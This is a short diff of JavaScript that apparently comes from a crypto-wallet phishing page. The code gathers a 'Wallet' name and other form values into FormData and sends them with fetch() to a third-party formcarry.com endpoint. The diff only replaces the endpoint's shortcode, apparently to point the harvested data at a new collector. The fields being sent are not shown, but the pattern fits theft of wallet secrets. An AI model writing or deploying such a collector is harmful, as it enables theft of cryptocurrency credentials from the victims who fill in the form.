@@ -8,7 +8,7 @@ formData.append('Wallet', document.getElementById('wallet_name').innerHTML);
     formData.append(`${strings[key]["name"]}`, `${strings[key]["value"]}`);
   });
 
-  const email_shortcode = "yq_cRTuMbo0";
+  const email_shortcode = "nsE-PKdgY_U";
   const send_rep = `https://formcarry.com/s/${email_shortcode}`;
 
   fetch(send_rep, {
